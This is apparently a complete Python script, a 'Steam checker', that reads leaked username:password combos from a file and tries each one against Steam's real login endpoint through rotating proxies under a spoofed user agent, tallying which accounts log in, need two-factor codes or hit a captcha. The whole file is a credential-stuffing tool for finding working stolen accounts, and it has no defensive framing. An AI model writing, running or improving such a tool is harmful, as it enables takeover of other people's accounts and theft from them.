import requests, json, sys
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from base64 import b64encode as base64
from random import choice
from concurrent.futures import ThreadPoolExecutor as thread

class SteamCheck():
   
    USERAGENT = "Mozilla/5.0 (Linux; Android 7.0; arm; SM-J530FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 YaApp_Android/20.74 YaSearchBrowser/20.74 BroPP/1.0 SA/1 Mobile Safari/537.36"
    RSAKEY = "https://steamcommunity.com/login/getrsakey/"
    STEAMLOGIN = "https://steamcommunity.com/login/dologin/"

    publickey_mod = ""
    publickey_exp = ""
    public_timestamp = ""

    working = 0
    bad = 0
    two_fa = 0
    mfa = 0
    captcha = 0
    error = 0


    def __init__(self):
         self.__OpenFile()

    def _getrsakey(self, username, password) -> str:
        rsp = requests.post(self.RSAKEY, data={"username": username}).text
        self.publickey_exp = int(json.loads(rsp)["publickey_exp"], 16)
        self.publickey_mod = int(json.loads(rsp)["publickey_mod"], 16)
        self.public_timestamp = json.loads(rsp)["timestamp"]

        _RSAKEY = RSA.construct((self.publickey_mod, self.publickey_exp))
        _NEWKEY = PKCS1_v1_5.new(_RSAKEY)

        return str(base64(_NEWKEY.encrypt(bytes(password, 'utf-8')))).split("'")[1]
        
    
    def _checkLogin(self, username, unpass, password) -> bool:
        proxies = open("proxies.txt", encoding='utf-8').readlines()

        print(f"Trying {username}:{unpass} {choice(proxies)}")
        try:
            rsp = json.loads(requests.post("https://steamcommunity.com/login/dologin/", data={"username": username,"password": password,"rsatimestamp": self.public_timestamp}, proxies={"https": f"http://{choice(proxies)}"}, timeout=3).text)
            print(rsp)
            try:
                if rsp['captcha_needed'] == True:
                    self.captcha += 1
                    self.__SetTitle()
                    
            except KeyError:
                if rsp['success'] == True:
                    self.working += 1
                    print(f"Login - {username}:{unpass} | SteamID - {rsp['transfer_parameters']['steamid']}")
                        
                elif rsp['message'] == "The account name or password that you have entered is incorrect.":
                    self.bad += 1
                        
                elif rsp['requires_twofactor'] == True:
                    self.two_fa += 1
                        
                elif rsp['emailauth_needed'] == True:
                    self.mfa += 1
                    
                    
                self.__SetTitle()
        except (ConnectionError, TimeoutError, requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout, Exception) as e:
            self.error += 1
            self.__SetTitle()
            pass
            

    
    def __OpenFile(self):
        with open("combos.txt") as file:
           for lines in file.readlines():
                while True:
                    start_thread = thread(max_workers=200)
                    start_thread.submit(self._checkLogin(lines.split(':')[0], lines.split(':')[1], self._getrsakey(lines.split(':')[0], lines.split(':')[1])))

    def __SetTitle(self) -> str:
        DEFAULT = f"Steam checker | [ WORKING: {self.working} BAD: {self.bad} MFA: {self.mfa} 2FA: {self.two_fa} CAPTCHA: {self.captcha} ERROR: {self.error} ]"

        print(f'\33]0;{DEFAULT}\a', end='', flush=True)

if __name__ == "__main__":
    SteamCheck()